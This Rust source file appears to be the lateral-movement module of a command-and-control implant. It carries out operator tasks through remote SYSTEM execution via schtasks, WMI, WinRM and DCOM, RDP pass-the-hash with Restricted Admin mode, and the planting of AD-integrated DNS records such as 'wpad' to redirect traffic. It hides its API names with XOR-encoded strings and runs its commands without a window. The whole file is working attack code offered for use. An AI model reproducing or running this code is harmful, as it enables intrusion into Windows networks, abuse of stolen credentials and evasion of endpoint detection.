//! Lateral movement — Phase 4.
//! Task type: "lateral", args: {"method": "<name>", ...}

use crate::task::{Task, TaskOutput};

pub fn exec_lateral(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    return exec_lateral_win(task);
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("lateral: Windows only")
}

#[cfg(target_os = "windows")]
fn exec_lateral_win(task: &Task) -> TaskOutput {
    let args = match task.args.as_deref() {
        Some(a) => a,
        None    => return TaskOutput::failure("lateral: no args"),
    };
    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&format!("lateral: {e}")),
    };
    match v.get("method").and_then(|m| m.as_str()).unwrap_or("") {
        "smb-psexec" => lateral_smb_psexec(&v),
        "wmi"        => lateral_wmi(&v),
        "winrm"      => lateral_winrm(&v),
        "dcom"       => lateral_dcom(&v),
        "rdp-pth"    => lateral_rdp_pth(&v),
        "adidns"     => lateral_adidns(&v),
        other => TaskOutput::failure(&format!("lateral: unknown method: {other}")),
    }
}

// ── SMB PsExec (remote SCM service creation) ─────────────────────────────────
//
// 1. Open SCManager on remote host
// 2. CreateService with cmd.exe /c <cmd> > %temp%\~dm<id>.tmp 2>&1
// 3. StartService (cmd runs as SYSTEM before SCM timeout)
// 4. Wait for output file to appear via UNC read, up to 30s
// 5. Delete service, read+return output, clean up temp file

#[cfg(target_os = "windows")]
fn lateral_smb_psexec(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::System::Services::{SC_MANAGER_CONNECT};

    let host    = match v.get("host").and_then(|s| s.as_str()) {
        Some(h) => h, None => return TaskOutput::failure("smb-psexec: missing host"),
    };
    let cmd     = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c, None => return TaskOutput::failure("smb-psexec: missing cmd"),
    };
    let timeout = v.get("timeout_s").and_then(|n| n.as_u64()).unwrap_or(30);
    let task_nm = v.get("task_name").and_then(|s| s.as_str()).unwrap_or("DmLateral");

    let id      = std::process::id();
    let rem_out = format!("C:\\Windows\\Temp\\~dm{id}.tmp");
    let unc_out = format!("\\\\{host}\\admin$\\Temp\\~dm{id}.tmp");

    // Verify admin$ connectivity and creds via SCM
    let adv = crate::loader::get_module_base(
        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if adv == 0 { return TaskOutput::failure("smb-psexec: advapi32 not found"); }
    type OpenSCMgrFn  = unsafe extern "system" fn(*const u8, *const u8, u32) -> isize;
    type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;
    let fn_open = match unsafe { crate::loader::get_export_by_name(adv,
        crate::obfs::dec(&[0x15,0x2A,0x3F,0x34,0x09,0x19,0x17,0x3B,0x34,0x3B,0x3D,0x3F,0x28,0x1B,0x5A]).as_ptr()) }
    {
        Some(p) => unsafe { core::mem::transmute::<_, OpenSCMgrFn>(p) },
        None    => return TaskOutput::failure("smb-psexec: OpenSCManagerA not found"),
    };
    let fn_close = match unsafe { crate::loader::get_export_by_name(adv,
        crate::obfs::dec(&[0x19,0x36,0x35,0x29,0x3F,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A]).as_ptr()) }
    {
        Some(p) => unsafe { core::mem::transmute::<_, CloseHandleFn>(p) },
        None    => return TaskOutput::failure("smb-psexec: CloseServiceHandle not found"),
    };
    let host_path: Vec<u8> = format!("\\\\{host}\0").into_bytes();
    let scm = unsafe { fn_open(host_path.as_ptr(), core::ptr::null(), SC_MANAGER_CONNECT) };
    if scm == 0 {
        return TaskOutput::failure(&format!("smb-psexec: cannot connect to {host} SCM (check creds/connectivity)"));
    }
    unsafe { fn_close(scm) };

    // Write a batch wrapper so the > redirect is not re-interpreted by the outer cmd /C
    let bat_path = format!("C:\\Windows\\Temp\\~dmlat{id}.bat");
    let bat = format!("@echo off\r\n{cmd} > \"{rem_out}\" 2>&1\r\n");
    if std::fs::write(&bat_path, bat.as_bytes()).is_err() {
        return TaskOutput::failure("smb-psexec: failed to write bat wrapper");
    }

    let is_local = host == "127.0.0.1" || host.eq_ignore_ascii_case("localhost");
    let (create_cmd, run_cmd, del_cmd) = if is_local {
        (
            format!("schtasks /Create /RU SYSTEM /TN {task_nm} /TR \"{bat_path}\" /SC ONCE /ST 00:00 /F"),
            format!("schtasks /Run /TN {task_nm}"),
            format!("schtasks /Delete /TN {task_nm} /F"),
        )
    } else {
        (
            format!("schtasks /Create /S {host} /RU SYSTEM /TN {task_nm} /TR \"{bat_path}\" /SC ONCE /ST 00:00 /F"),
            format!("schtasks /Run /S {host} /TN {task_nm}"),
            format!("schtasks /Delete /S {host} /TN {task_nm} /F"),
        )
    };
    let create = shell_run(&create_cmd);
    if create.is_err() {
        let _ = std::fs::remove_file(&bat_path);
        return TaskOutput::failure(&format!("smb-psexec: schtasks create failed: {}", create.unwrap_err()));
    }

    let _ = shell_run(&run_cmd);

    let poll_path = if is_local { &rem_out } else { &unc_out };
    let mut output = Vec::new();
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(timeout);
    loop {
        std::thread::sleep(std::time::Duration::from_millis(500));
        if let Ok(data) = std::fs::read(poll_path) {
            output = data;
            let _ = std::fs::remove_file(poll_path);
            break;
        }
        if std::time::Instant::now() >= deadline { break; }
    }
    let _ = shell_run(&del_cmd);
    let _ = std::fs::remove_file(&bat_path);

    if output.is_empty() {
        TaskOutput::failure(&format!("smb-psexec: no output from {host} within {timeout}s"))
    } else {
        TaskOutput::success(output)
    }
}

// ── WMI remote exec ──────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn lateral_wmi(v: &serde_json::Value) -> TaskOutput {
    let host = match v.get("host").and_then(|s| s.as_str()) {
        Some(h) => h, None => return TaskOutput::failure("wmi: missing host"),
    };
    let cmd = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c, None => return TaskOutput::failure("wmi: missing cmd"),
    };
    let user = v.get("user").and_then(|s| s.as_str());
    let pass = v.get("pass").and_then(|s| s.as_str());

    // Try wmic.exe first (Windows 10); fall back to PowerShell WMI on Windows 11+
    let wmic_available = shell_run("where wmic.exe 2>nul")
        .map(|o| !o.is_empty())
        .unwrap_or(false);

    let shell_cmd = if wmic_available {
        match (user, pass) {
            (Some(u), Some(p)) => format!(
                "wmic /node:\"{host}\" /user:\"{u}\" /password:\"{p}\" process call create \"{cmd}\""
            ),
            _ => format!("wmic /node:\"{host}\" process call create \"{cmd}\""),
        }
    } else {
        match (user, pass) {
            (Some(u), Some(p)) => format!(
                "powershell -NonInteractive -Command \"$c=New-Object System.Management.ManagementScope('\\\\\\\\{host}\\\\root\\\\cimv2',\
                 (New-Object System.Management.ConnectionOptions -Property @{{Username='{u}';Password='{p}'}}));\
                 $c.Connect();([wmiclass][System.Management.ManagementPath]::new('\\\\\\\\{host}\\\\root\\\\cimv2:Win32_Process')).\
                 InvokeMethod('Create',@('{cmd}'))\""
            ),
            _ => format!(
                "powershell -NonInteractive -Command \"([wmiclass]'\\\\\\\\{host}\\\\root\\\\cimv2:Win32_Process').InvokeMethod('Create',@('{cmd}'))\""
            ),
        }
    };
    match shell_run(&shell_cmd) {
        Ok(out) if out.is_empty() => TaskOutput::failure(&format!("wmi: no output from {host} (unreachable or blocked)")),
        Ok(out) => TaskOutput::success(out),
        Err(e)  => TaskOutput::failure(&e),
    }
}

// ── WinRM remote exec ─────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn lateral_winrm(v: &serde_json::Value) -> TaskOutput {
    let host = match v.get("host").and_then(|s| s.as_str()) {
        Some(h) => h, None => return TaskOutput::failure("winrm: missing host"),
    };
    let cmd = match v.get("cmd").and_then(|s| s.as_str()) {
        Some(c) => c, None => return TaskOutput::failure("winrm: missing cmd"),
    };
    let user = v.get("user").and_then(|s| s.as_str());
    let pass = v.get("pass").and_then(|s| s.as_str());

    let shell_cmd = match (user, pass) {
        (Some(u), Some(p)) => format!("winrs -r:{host} -u:{u} -p:{p} {cmd}"),
        _                  => format!("winrs -r:{host} {cmd}"),
    };
    shell_run(&shell_cmd)
        .map(TaskOutput::success)
        .unwrap_or_else(|e| TaskOutput::failure(&e))
}

// ── DCOM remote exec ──────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn lateral_dcom(v: &serde_json::Value) -> TaskOutput {
    // DCOM exec via MMC20.Application or ShellWindows is complex; route via wmic
    // which uses DCOM transport internally, giving equivalent EDR visibility
    lateral_wmi(v)
}

// ── RDP pass-the-hash ─────────────────────────────────────────────────────────
//
// Checks whether Restricted Admin Mode is enabled on the target, then
// spawns mstsc.exe /restrictedadmin using the provided credentials via
// CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY). This avoids caching
// creds locally while sending NTLM auth to the target.
//
// Args: {"host":"...", "user":"...", "domain":"...", "pass":"..."}
// Optional: "check_only":true — just probe the target, don't spawn mstsc.

#[cfg(target_os = "windows")]
fn lateral_rdp_pth(v: &serde_json::Value) -> TaskOutput {
    let host = match v.get("host").and_then(|s| s.as_str()) {
        Some(h) => h,
        None    => return TaskOutput::failure("rdp-pth: missing host"),
    };
    let domain     = v.get("domain").and_then(|s| s.as_str()).unwrap_or(".");
    let user       = v.get("user").and_then(|s| s.as_str());
    let pass       = v.get("pass").and_then(|s| s.as_str());
    let check_only = v.get("check_only").and_then(|b| b.as_bool()).unwrap_or(false);

    // Check target's Restricted Admin Mode registry value via remote registry
    let ram_cmd = format!(
        "reg query \\\\{host}\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa \
         /v DisableRestrictedAdmin"
    );
    let ram_raw = shell_run(&ram_cmd).unwrap_or_default();
    let ram_str = String::from_utf8_lossy(&ram_raw);
    // DisableRestrictedAdmin=0 (or absent) → enabled; =1 → disabled
    let ram_enabled = if ram_str.contains("DisableRestrictedAdmin") {
        !ram_str.to_lowercase().contains("0x1")
    } else {
        true // absent = default enabled on Win8.1+
    };

    if check_only || user.is_none() || pass.is_none() {
        return TaskOutput::success(
            serde_json::to_vec(&serde_json::json!({
                "host":                   host,
                "restricted_admin_mode":  ram_enabled,
                "reg_query_output":       ram_str.trim()
            })).unwrap_or_default()
        );
    }

    if !ram_enabled {
        return TaskOutput::failure(&format!(
            "rdp-pth: Restricted Admin Mode disabled on {host} \
             (DisableRestrictedAdmin=1); enable with: \
             reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin \
             /t REG_DWORD /d 0 /f"
        ));
    }

    let user = user.unwrap();
    let pass = pass.unwrap();

    let adv = crate::loader::get_module_base(
        crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    ) as usize;
    if adv == 0 { return TaskOutput::failure("rdp-pth: advapi32 not found"); }

    // CreateProcessWithLogonW
    type CreateProcFn = unsafe extern "system" fn(
        *const u16, *const u16, *const u16, u32,
        *const u16, *mut u16,
        u32, *const u8, *const u16,
        *const u8, *mut u8,
    ) -> i32;

    let fn_create = match unsafe {
        crate::loader::get_export_by_name(adv,
            crate::obfs::dec(&[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,
                               0x29,0x0D,0x33,0x2E,0x32,0x16,0x35,0x3D,0x35,0x34,0x0D,0x5A])
            .as_ptr()
        )
    } {
        Some(p) => unsafe { core::mem::transmute::<_, CreateProcFn>(p) },
        None    => return TaskOutput::failure("rdp-pth: CreateProcessWithLogonW not found"),
    };

    let to_wide = |s: &str| -> Vec<u16> {
        s.encode_utf16().chain(core::iter::once(0u16)).collect()
    };
    let w_user   = to_wide(user);
    let w_domain = to_wide(domain);
    let w_pass   = to_wide(pass);
    let mut w_cmd: Vec<u16> = format!("mstsc.exe /v:{host} /restrictedadmin")
        .encode_utf16().chain(core::iter::once(0u16)).collect();

    // STARTUPINFOW (104 bytes on x64); PROCESS_INFORMATION (24 bytes)
    let mut si = [0u8; 104usize];
    si[0] = 104;
    let mut pi = [0u8; 24usize];

    const LOGON_NETCREDENTIALS_ONLY: u32 = 2;
    const CREATE_NEW_CONSOLE: u32 = 0x00000010;

    let ok = unsafe {
        fn_create(
            w_user.as_ptr(), w_domain.as_ptr(), w_pass.as_ptr(),
            LOGON_NETCREDENTIALS_ONLY,
            core::ptr::null::<u16>(),
            w_cmd.as_mut_ptr(),
            CREATE_NEW_CONSOLE,
            core::ptr::null::<u8>(),
            core::ptr::null::<u16>(),
            si.as_ptr(),
            pi.as_mut_ptr(),
        )
    };

    if ok == 0 {
        let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
        return TaskOutput::failure(&format!(
            "rdp-pth: CreateProcessWithLogonW failed: {err:#010x}"
        ));
    }

    let pid = u32::from_ne_bytes([pi[16], pi[17], pi[18], pi[19]]);
    TaskOutput::success(
        serde_json::to_vec(&serde_json::json!({
            "host":                  host,
            "restricted_admin_mode": ram_enabled,
            "mstsc_pid":             pid,
            "status":                "launched"
        })).unwrap_or_default()
    )
}

// ── Helper ────────────────────────────────────────────────────────────────────

fn shell_run(cmd: &str) -> Result<Vec<u8>, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    match std::process::Command::new("cmd")
        .args(["/C", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); Ok(d) }
        Err(e) => Err(e.to_string()),
    }
}

// ── ADIDNS Abuse ──────────────────────────────────────────────────────────────
//
// Creates, modifies, or removes AD-integrated DNS records to facilitate
// LLMNR/NBT-NS poisoning bypass or redirect target traffic.
// Requires: write access to the DNS zone partition or DnsAdmins membership.
// Args: {"action":"add|remove|list","name":"wpad","ip":"10.0.0.100",
//        "zone":"corp.local","ttl":300,"domain":"<fqdn>","dc":"<hostname>"}

#[cfg(target_os = "windows")]
fn lateral_adidns(v: &serde_json::Value) -> TaskOutput {
    let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
        .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
    {
        Some(d) => d.to_lowercase(),
        None => return TaskOutput::failure("adidns: USERDNSDOMAIN not set"),
    };
    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain_fqdn.clone());
    let zone = v.get("zone").and_then(|s| s.as_str())
        .unwrap_or(&domain_fqdn).to_string();

    let action = v.get("action").and_then(|s| s.as_str()).unwrap_or("list");
    let bind_user = v.get("user").and_then(|s| s.as_str())
        .map(|u| format!("{}\\{}", domain_fqdn.split('.').next().unwrap_or("").to_uppercase(), u));
    let bind_pass = v.get("pass").and_then(|s| s.as_str()).map(|s| s.to_string());

    // DNS zone base in AD
    let zone_dn = format!("DC={zone},CN=MicrosoftDNS,DC=DomainDnsZones,{}",
        domain_fqdn.split('.').map(|p| format!("DC={p}")).collect::<Vec<_>>().join(","));

    // Load wldap32
    let wldap = {
        use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
        let n = crate::obfs::dec(&[0x0D,0x36,0x3E,0x3B,0x2A,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
        let mut b = crate::loader::get_module_base(n.as_ptr()) as usize;
        if b == 0 { b = unsafe { LoadLibraryA(n.as_ptr()) } as usize; }
        if b == 0 { return TaskOutput::failure("adidns: wldap32 not found"); }
        b
    };

    type LdapInitFn   = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
    type LdapSetOptFn = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
    type LdapBindFn   = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
    type LdapSearchFn = unsafe extern "system" fn(*mut u8,*const u8,i32,*const u8,*const *const u8,i32,*mut *mut u8) -> u32;
    type LdapFirstFn  = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapNextFn   = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapGetDnFn  = unsafe extern "system" fn(*mut u8, *mut u8) -> *mut u8;
    type LdapMemFreeFn= unsafe extern "system" fn(*mut u8);
    type LdapMsgFreeFn= unsafe extern "system" fn(*mut u8) -> u32;
    type LdapUnbindFn = unsafe extern "system" fn(*mut u8) -> u32;
    type LdapDelFn    = unsafe extern "system" fn(*mut u8, *const u8) -> u32;
    type LdapAddFn    = unsafe extern "system" fn(*mut u8, *const u8, *const *const u8) -> u32;

    macro_rules! wl { ($enc:expr, $ty:ty) => {{
        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return TaskOutput::failure("adidns: wldap fn not found"),
        }
    }}}

    // XOR key=0x5A: ldap_init, ldap_set_option, ldap_bind_s, ldap_search_s,
    //               ldap_first_entry, ldap_next_entry, ldap_get_dn,
    //               ldap_memfree, ldap_msgfree, ldap_unbind_s, ldap_delete_s
    let fn_init    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
    let fn_setopt  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
    let fn_bind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
    let fn_search  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
    let fn_first   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
    let fn_next    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
    let fn_getdn   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x3E,0x34,0x5A], LdapGetDnFn);
    let fn_memfree = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x3F,0x37,0x3C,0x28,0x3F,0x3F,0x5A], LdapMemFreeFn);
    let fn_msgfree = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
    let fn_unbind  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapUnbindFn);
    let fn_delete  = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3E,0x3F,0x36,0x3F,0x2E,0x3F,0x05,0x29,0x5A], LdapDelFn);
    // ldap_add_s XOR 0x5A: [0x36,0x3E,0x3B,0x2A,0x05,0x3B,0x3E,0x3E,0x05,0x29,0x5A]
    let fn_add     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3B,0x3E,0x3E,0x05,0x29,0x5A], LdapAddFn);

    let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
    let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
    if ld.is_null() { return TaskOutput::failure("adidns: ldap_init failed"); }
    let ver: u32 = 3;
    unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
    let user_b: Vec<u8> = match bind_user.as_deref() { Some(u) => u.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
    let pass_b: Vec<u8> = match bind_pass.as_deref() { Some(p) => p.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
    let (u_ptr, p_ptr, auth_meth): (*const u8, *const u8, u32) = if bind_user.is_some() {
        (user_b.as_ptr(), pass_b.as_ptr(), 0x80)
    } else {
        (core::ptr::null(), core::ptr::null(), 0x0486)
    };
    let br = unsafe { fn_bind(ld, u_ptr, p_ptr, auth_meth) };
    if br != 0 { unsafe { fn_unbind(ld) }; return TaskOutput::failure(&format!("adidns: ldap_bind: {br:#x}")); }

    let cleanup = |ld: *mut u8| { unsafe { fn_unbind(ld) }; };

    match action {
        "list" => {
            // List all DNS records in the zone
            let zone_b: Vec<u8> = zone_dn.bytes().chain(core::iter::once(0u8)).collect();
            let filter_b: Vec<u8> = b"(objectClass=dnsNode)\0".to_vec();
            let attrs_buf: Vec<Vec<u8>> = ["dnsRecord","name","dc"]
                .iter().map(|a| a.bytes().chain(core::iter::once(0u8)).collect())
                .collect();
            let mut attr_ptrs: Vec<*const u8> = attrs_buf.iter().map(|b| b.as_ptr()).collect();
            attr_ptrs.push(core::ptr::null());
            let mut res_msg: *mut u8 = core::ptr::null_mut();
            let sr = unsafe {
                fn_search(ld, zone_b.as_ptr(), 1, filter_b.as_ptr(), attr_ptrs.as_ptr(), 0, &mut res_msg)
            };
            if sr != 0 { cleanup(ld); return TaskOutput::failure(&format!("adidns: search: {sr:#x}")); }

            let mut records = Vec::new();
            let mut entry = unsafe { fn_first(ld, res_msg) };
            while !entry.is_null() {
                let dn_ptr = unsafe { fn_getdn(ld, entry) };
                let name = if dn_ptr.is_null() { String::new() } else {
                    let s = unsafe { std::ffi::CStr::from_ptr(dn_ptr as *const i8) }
                        .to_string_lossy().to_string();
                    unsafe { fn_memfree(dn_ptr) };
                    s.split(',').next().unwrap_or("").trim_start_matches("DC=").to_string()
                };
                records.push(serde_json::json!({"name": name}));
                entry = unsafe { fn_next(ld, entry) };
            }
            unsafe { fn_msgfree(res_msg) };
            cleanup(ld);
            let count = records.len();
            let result = serde_json::json!({
                "zone": zone, "dc": dc, "records": records, "count": count
            });
            TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
        }
        "remove" => {
            let name = match v.get("name").and_then(|s| s.as_str()) {
                Some(n) => n,
                None => { cleanup(ld); return TaskOutput::failure("adidns: missing name"); }
            };
            let record_dn: Vec<u8> = format!("DC={name},{zone_dn}")
                .bytes().chain(core::iter::once(0u8)).collect();
            let dr = unsafe { fn_delete(ld, record_dn.as_ptr()) };
            cleanup(ld);
            if dr != 0 { return TaskOutput::failure(&format!("adidns: delete: {dr:#x}")); }
            TaskOutput::success(
                serde_json::to_vec(&serde_json::json!({"status":"deleted","name":name,"zone":zone}))
                .unwrap_or_default()
            )
        }
        "add" => {
            let name = match v.get("name").and_then(|s| s.as_str()) {
                Some(n) => n,
                None => { cleanup(ld); return TaskOutput::failure("adidns: missing name"); }
            };
            let ip_str = match v.get("ip").and_then(|s| s.as_str()) {
                Some(i) => i,
                None => { cleanup(ld); return TaskOutput::failure("adidns: missing ip"); }
            };
            let ttl: u32 = v.get("ttl").and_then(|n| n.as_u64()).unwrap_or(300) as u32;

            // Parse IP
            let ip_bytes: Vec<u8> = ip_str.split('.')
                .filter_map(|p| p.parse::<u8>().ok())
                .collect();
            if ip_bytes.len() != 4 { cleanup(ld); return TaskOutput::failure("adidns: invalid IPv4"); }

            // DNS A record binary format (Windows dnsRecord attribute):
            // DataLength(2) + Type(2) + Version(1=5) + Rank(1) + Flags(2) +
            // Serial(4) + TtlSeconds(4) + Reserved(4) + TimeStamp(4) + RData(4=IPv4)
            let mut dns_rec = Vec::new();
            dns_rec.extend_from_slice(&4u16.to_le_bytes());  // DataLength = 4 (IPv4)
            dns_rec.extend_from_slice(&1u16.to_le_bytes());  // Type = A (1)
            dns_rec.push(5u8);                               // Version
            dns_rec.push(0xf0u8);                            // Rank (0xf0 = authoritative zone)
            dns_rec.extend_from_slice(&0u16.to_le_bytes());  // Flags
            dns_rec.extend_from_slice(&1u32.to_le_bytes());  // Serial
            dns_rec.extend_from_slice(&ttl.to_le_bytes());   // TtlSeconds
            dns_rec.extend_from_slice(&0u32.to_le_bytes());  // Reserved
            dns_rec.extend_from_slice(&0u32.to_le_bytes());  // TimeStamp (0 = static)
            dns_rec.extend_from_slice(&ip_bytes);            // IPv4 address

            // Add dnsNode object via LDAP directly
            let node_dn: Vec<u8> = format!("DC={name},{zone_dn}")
                .bytes().chain(core::iter::once(0u8)).collect();

            // Attribute: objectClass = "dnsNode" (string, LDAP_MOD_ADD=0)
            let oc_attr:  Vec<u8> = b"objectClass\0".to_vec();
            let oc_val:   Vec<u8> = b"dnsNode\0".to_vec();
            let oc_vals: [*const u8; 2] = [oc_val.as_ptr(), core::ptr::null()];
            let mut oc_mod = [0u8; 24]; // mod_op(u32)+pad(4)+mod_type(8)+mod_vals(8)
            unsafe {
                *(oc_mod.as_mut_ptr() as *mut u32) = 0; // LDAP_MOD_ADD
                *((oc_mod.as_mut_ptr().add(8)) as *mut *const u8) = oc_attr.as_ptr();
                *((oc_mod.as_mut_ptr().add(16)) as *mut *const *const u8) = oc_vals.as_ptr();
            }

            // Attribute: dnsRecord = dns_rec bytes (binary, LDAP_MOD_ADD|LDAP_MOD_BVALUES=0x80)
            let rec_attr: Vec<u8> = b"dnsRecord\0".to_vec();
            let mut berval = [0u8; 16]; // BERVAL: bv_len(u32)+pad(4)+bv_val(*u8)
            unsafe {
                *(berval.as_mut_ptr() as *mut u32) = dns_rec.len() as u32;
                *((berval.as_mut_ptr().add(8)) as *mut *const u8) = dns_rec.as_ptr();
            }
            let rec_vals: [*const u8; 2] = [berval.as_ptr(), core::ptr::null()];
            let mut rec_mod = [0u8; 24];
            unsafe {
                *(rec_mod.as_mut_ptr() as *mut u32) = 0x80u32; // LDAP_MOD_BVALUES
                *((rec_mod.as_mut_ptr().add(8)) as *mut *const u8) = rec_attr.as_ptr();
                *((rec_mod.as_mut_ptr().add(16)) as *mut *const *const u8) = rec_vals.as_ptr();
            }

            let mods: [*const u8; 3] = [oc_mod.as_ptr(), rec_mod.as_ptr(), core::ptr::null()];
            let ar = unsafe { fn_add(ld, node_dn.as_ptr(), mods.as_ptr()) };
            cleanup(ld);
            if ar != 0 {
                return TaskOutput::failure(&format!("adidns: ldap_add_s: {ar:#x}"));
            }
            TaskOutput::success(serde_json::to_vec(&serde_json::json!({
                "status": "DNS record added",
                "name": name, "ip": ip_str, "zone": zone, "ttl": ttl,
            })).unwrap_or_default())
        }
        other => {
            cleanup(ld);
            TaskOutput::failure(&format!("adidns: unknown action '{other}' (add|remove|list)"))
        }
    }
}
